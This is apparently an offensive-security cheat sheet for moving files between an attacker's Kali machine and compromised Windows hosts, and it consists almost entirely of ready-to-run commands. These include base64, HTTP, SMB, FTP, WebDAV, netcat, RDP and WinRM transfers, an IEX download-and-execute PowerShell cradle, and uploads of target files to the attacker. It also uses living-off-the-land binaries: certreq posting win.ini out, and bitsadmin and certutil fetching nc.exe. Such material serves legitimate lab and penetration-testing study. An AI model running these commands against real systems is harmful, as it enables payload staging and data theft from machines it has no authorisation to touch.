# Windows File Transfer

> Replace `<KALI-IP>`, `<PORT>`, `<FILE>`, and `<PATH>` with your values.

## 1. Base64 — Kali → Windows

### Kali

```bash
base64 -w 0 <FILE>
md5sum <FILE>
sha256sum <FILE>
```

### Windows PowerShell

```powershell
[IO.File]::WriteAllBytes('C:\Users\Public\<FILE>',[Convert]::FromBase64String('<BASE64>'))
Get-FileHash 'C:\Users\Public\<FILE>' -Algorithm MD5
Get-FileHash 'C:\Users\Public\<FILE>' -Algorithm SHA256
```

## 2. Base64 — Windows → Kali

### Windows PowerShell

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\<FILE>'))
Get-FileHash 'C:\path\<FILE>' -Algorithm MD5
Get-FileHash 'C:\path\<FILE>' -Algorithm SHA256
```

### Kali

```bash
echo '<BASE64>' | base64 -d > <FILE>
md5sum <FILE>
sha256sum <FILE>
```

---

## 3. HTTP Download — Kali → Windows

### Kali: HTTP server

```bash
python3 -m http.server 8000 --directory /tmp
```

### Windows PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('http://<KALI-IP>:8000/<FILE>','C:\Users\Public\<FILE>')
```

```powershell
Invoke-WebRequest 'http://<KALI-IP>:8000/<FILE>' -OutFile 'C:\Users\Public\<FILE>'
```

### Download as string

```powershell
(New-Object Net.WebClient).DownloadString('http://<KALI-IP>:8000/<FILE>')
```

### Download + execute PowerShell script

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<KALI-IP>:8000/<FILE>.ps1')
```

### Older Windows PowerShell

```powershell
Invoke-WebRequest 'http://<KALI-IP>:8000/<FILE>' -UseBasicParsing -OutFile 'C:\Users\Public\<FILE>'
```

---

## 4. SMB — Kali → Windows

### Kali: SMB server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

### Windows

```cmd
copy \\<KALI-IP>\share\<FILE> C:\Users\Public\<FILE>
```

### Authenticated SMB

```bash
sudo impacket-smbserver share /tmp/smbshare -smb2support -user test -password test
```

```cmd
net use N: \\<KALI-IP>\share /user:test test
copy N:\<FILE> C:\Users\Public\<FILE>
net use N: /delete
```

### Windows → Kali SMB share

```cmd
copy C:\path\<FILE> \\<KALI-IP>\share\<FILE>
```

### List SMB shares

```cmd
net view \\<KALI-IP>
```

---

## 5. FTP — Kali → Windows

### Kali: FTP server

```bash
sudo python3 -m pyftpdlib --port 21
```

### Windows PowerShell

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://<KALI-IP>/<FILE>','C:\Users\Public\<FILE>')
```

### Windows FTP client

```cmd
ftp -v -n -s:ftpcommand.txt
```

### `ftpcommand.txt`

```text
open <KALI-IP>
USER anonymous
binary
GET <FILE>
bye
```

---

## 6. FTP Upload — Windows → Kali

### Kali: allow writes

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

### Windows PowerShell

```powershell
(New-Object Net.WebClient).UploadFile('ftp://<KALI-IP>/<FILE>','C:\path\<FILE>')
```

### Windows FTP client

```cmd
ftp -v -n -s:ftpcommand.txt
```

### `ftpcommand.txt`

```text
open <KALI-IP>
USER anonymous
binary
PUT C:\path\<FILE>
bye
```

---

## 7. WebDAV — Windows ↔ Kali

### Kali: WebDAV server

```bash
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

### Windows: list WebDAV root

```cmd
dir \\<KALI-IP>\DavWWWRoot
```

### Kali → Windows

```cmd
copy \\<KALI-IP>\DavWWWRoot\<FILE> C:\Users\Public\<FILE>
```

### Windows → Kali

```cmd
copy C:\path\<FILE> \\<KALI-IP>\DavWWWRoot\<FILE>
```

---

## 8. HTTP Upload — Windows → Kali

### Kali: upload server

```bash
pip3 install uploadserver
python3 -m uploadserver
```

### Windows PowerShell

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<KALI-IP>:8000/upload -File C:\path\<FILE>
```

### Base64 over HTTP POST

```powershell
$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\<FILE>'))
Invoke-WebRequest -Uri 'http://<KALI-IP>:8000/' -Method POST -Body $b64
```

### Kali listener

```bash
nc -lvnp 8000
```

### Decode

```bash
echo '<BASE64>' | base64 -d > <FILE>
```

---

## 9. UPX + exe2hex — EXE via Clipboard

### Compress EXE

```bash
upx -9 file.exe
```

### Convert EXE to CMD/ASCII

```bash
exe2hex -x file.exe -p file.cmd
```

### Copy generated commands to clipboard

```bash
cat file.cmd | xclip -selection clipboard
```

---

## 10. Hash Verification

### Kali

```bash
md5sum <FILE>
sha256sum <FILE>
```

### Windows

```powershell
Get-FileHash 'C:\path\<FILE>' -Algorithm MD5
Get-FileHash 'C:\path\<FILE>' -Algorithm SHA256
```

---

## Quick Picks

```text
No network + clipboard  → Base64 / exe2hex
HTTP/HTTPS              → python3 -m http.server + PowerShell
SMB/445                 → impacket-smbserver
FTP/21                  → pyftpdlib
HTTP + WebDAV           → wsgidav / DavWWWRoot
HTTP upload             → uploadserver / POST
```

---

## 11. Windows — JavaScript / VBScript Downloads

### `wget.js`
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Run JavaScript with `cscript.exe`
```cmd
cscript.exe /nologo wget.js http://<KALI-IP>:8000/<FILE> C:\Users\Public\<FILE>
```

### `wget.vbs`
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send
with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Run VBScript with `cscript.exe`
```cmd
cscript.exe /nologo wget.vbs http://<KALI-IP>:8000/<FILE> C:\Users\Public\<FILE>
```

# Miscellaneous File Transfer Methods

## Netcat / Ncat

### Target listens → Attacker sends

```cmd
:: Target
nc -l -p 8000 > file.exe
```

```bash
# Attacker
nc -q 0 TARGET_IP 8000 < file.exe
```

### Attacker listens → Target connects

```bash
# Attacker
sudo nc -l -p 443 -q 0 < file.exe
```

```cmd
:: Target
nc ATTACKER_IP 443 > file.exe
```

### Ncat

```bash
# Attacker
sudo ncat -l -p 443 --send-only < file.exe
```

```cmd
:: Target
ncat ATTACKER_IP 443 --recv-only > file.exe
```

---

## PowerShell Remoting / WinRM

### Check WinRM

```powershell
Test-NetConnection -ComputerName TARGET -Port 5985
```

### Create session

```powershell
$Session = New-PSSession -ComputerName TARGET
```

### Local → Remote

```powershell
Copy-Item -Path C:\file.exe -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

### Remote → Local

```powershell
Copy-Item -Path C:\Users\Administrator\Desktop\file.exe -FromSession $Session -Destination C:\
```

### WinRM ports

```text
5985/tcp = HTTP
5986/tcp = HTTPS
```

---

## RDP File Transfer

### Linux → Windows RDP with rdesktop

```bash
rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' \
-r disk:linux='/home/user/share'
```

### Linux → Windows RDP with xfreerdp

```bash
xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' \
/drive:linux,/home/user/share
```

### Access redirected drive inside RDP session

```text
\\tsclient\linux
```

### Native Windows RDP client

```cmd
mstsc
```

```text
Local Resources
→ More...
→ Drives
```

Then access:

```text
\\tsclient\
```

## Living off the Land

### Windows

#### `certreq.exe` — Target → Attacker

```bash
# Attacker
sudo nc -lvnp 8000
```

```cmd
:: Target
certreq.exe -Post -config http://10.10.10.32:8000/ C:\Windows\win.ini
```

#### BITS — Attacker → Target

```cmd
bitsadmin /transfer wcb /priority foreground http://10.10.10.32:8000/nc.exe C:\Windows\Temp\nc.exe
```

```powershell
Import-Module BitsTransfer

Start-BitsTransfer `
    -Source "http://10.10.10.32:8000/nc.exe" `
    -Destination "C:\Windows\Temp\nc.exe"
```

#### `certutil.exe` — Attacker → Target

```cmd
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

---
